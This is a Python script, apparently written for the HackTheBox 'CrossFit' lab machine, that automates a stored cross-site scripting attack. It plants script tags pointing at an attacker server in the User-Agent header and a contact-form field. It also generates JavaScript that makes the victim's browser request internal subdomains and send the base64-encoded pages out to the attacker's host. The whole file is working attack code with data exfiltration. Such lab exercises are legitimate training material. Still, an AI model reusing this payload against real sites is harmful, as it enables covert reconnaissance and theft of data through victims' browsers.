# hackthebox crossfit machine
# enumerate subdomains using XSS vulnerability and JS requests
import requests
from time import sleep
from collections import OrderedDict

proxies = {'http':'http://127.0.0.1:8080'}
headers = { 
    'User-Agent':'<script src=\"http://10.10.14.8/givesub.js\"></script>'
    }
#to keep data params in order but its not ordered anyway xd
data = OrderedDict(name='asd',email='asd%asd.htb',phone='123456789',message='<script src="http://10.10.14.8/givesub.js"></script>',submit='submit')

#r = requests.post("http://gym-club.crossfit.htb/blog-single.php",data=data,headers=headers,proxies=proxies)
with open('sublist.txt') as f:
    subdomains = f.read().splitlines()
    f.close()

subLength = len(subdomains)

for i in range(1,subLength):
    xssGetSubdomains = '''
    myhttpserver = 'http://10.10.14.8/'
    targeturl = 'http://%s.crossfit.htb/'
    
    req = new XMLHttpRequest;
    req.onreadystatechange = function() {
        if (req.readyState == 4) {
                req2 = new XMLHttpRequest;
                req2.open('GET', myhttpserver + btoa(this.responseText),false);
                req2.send();
            }
    }
    req.open('GET', targeturl, false);
    req.send();
    ''' % (subdomains[i])
    with open('givesub.js','w') as file:
        file.write(xssGetSubdomains)
    r = requests.post("http://gym-club.crossfit.htb/blog-single.php",data=data,headers=headers,proxies=proxies)
    sleep(5)
